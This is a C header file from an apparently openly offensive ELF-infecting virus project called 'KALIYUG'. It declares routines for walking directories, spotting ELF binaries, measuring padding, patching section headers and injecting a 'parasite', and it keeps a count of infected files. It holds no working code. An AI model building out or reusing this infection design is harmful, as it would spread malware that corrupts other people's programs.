#pragma once
#include <elf.h>


// Put all the MACROS, function prototypes, globally used variables and constants in this header file
// Make a function/variable static so that it cannot be called/used by any function outside the scope
// of the current source file (.c)

// header files should declare not define


#define PAGE_SIZE sysconf(_SC_PAGE_SIZE)


#define MAGIC_ELF "\x7f\x45\x4c\x46"
#define LOG_FILE_HEADER "\n\n\nx-x-x-x-x-x-x- compilepeace showed mercy on files bellow -x-x-x-x-x-x-x\n\n"
#define LOG_FILE_FOOTER "\nx-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x\n\n\n"
#define SIGNATURE "\n\n\n-x-x-x-x- \033[1m\033[31mKALIYUG \033[0m : \033[31mThe End Begins\033[0m -x-x-x-x-\n\n\n"


// Using extern keyword we cannot initialize these variables here, they are here just to link them to
// other .c files (i.e. they can be used/manipulated via other C files also). They can be initialized
// and manipulated in other .c files only, not right here.
extern unsigned long int dir_count;
extern unsigned long int file_count;
extern unsigned long int elf_count;
extern char 			 *parasite_path;
extern unsigned int		 infected_count;


typedef struct Node
{
	char *name;			// It will store AbsPath of filename dynamically in heap segment (calloc)
	struct Node *next;	// The address of next node in linked list containing filenames

} FileList;


// Sharing *head of the FileList so that any .c file outside file_tamper.c is able to parse
// the linked ist and perform operations on file.
extern FileList *head;


// dir_tamper.c
void 				DirEntriesParse (char *);

// file_tamper.c
void 				FileCreateNode (char *);
static void 		AddNode (FileList *, char *);
static FileList 	*AllocMemory (char *, FileList *);
void				PrintLinkedList (FileList *);
const char			*GetFileType (char *);

// misc_routines.c
void        		Destroy (FileList *);
char				*GetAbsPath (char *, char *);
static int			IsELF(char *);

// evil_elf.c
void				ElfParser(char *);
void				FindAndReplace(uint8_t *, long int , long int);
void				PatchSHT(void *);
Elf64_Off			GetPaddingSize(void *);
void				LoadParasite();
void				*mmapFile(char *);
void				DumpMemory(void *, uint64_t );


/*
// elf.c
void				ElfParser(char *);
int					ParseElfHeader(void *);
void				ModifySHT(void *);
void				ModifyPHT(void *);
static void			ModifyMappedMemory(void *);
static void			InjectParasiteCode(void *, Elf64_Off);
*/
